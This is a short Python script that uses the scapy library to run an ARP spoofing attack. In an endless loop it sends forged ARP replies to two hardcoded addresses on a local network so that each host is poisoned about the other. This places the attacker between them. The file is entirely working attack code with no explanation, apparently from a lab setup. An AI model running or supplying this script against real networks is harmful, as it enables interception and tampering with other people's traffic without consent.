#/usr/bin/env python
from scapy.layers.l2 import ARP, Ether
import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_arp_request = broadcast / arp_request
    answered_list = scapy.srp(broadcast_arp_request, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

while True:
    spoof("192.168.63.174","192.168.63.2")
    spoof("192.168.63.2","192.168.63.174")
    time.sleep(2)